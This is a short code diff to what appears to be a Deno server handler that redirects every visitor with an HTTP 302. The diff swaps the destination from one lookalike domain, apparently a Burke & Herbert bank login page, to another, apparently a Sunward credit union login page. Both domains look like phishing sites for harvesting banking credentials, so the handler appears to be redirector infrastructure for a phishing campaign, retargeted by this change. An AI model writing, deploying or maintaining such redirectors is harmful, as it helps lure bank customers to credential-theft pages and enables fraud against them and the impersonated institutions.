@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://digitburkeandherbert.online/bh/login_/",
+      Location: "https://accesunacctonline.info/sunward/fcu/",
     },
   });
 });
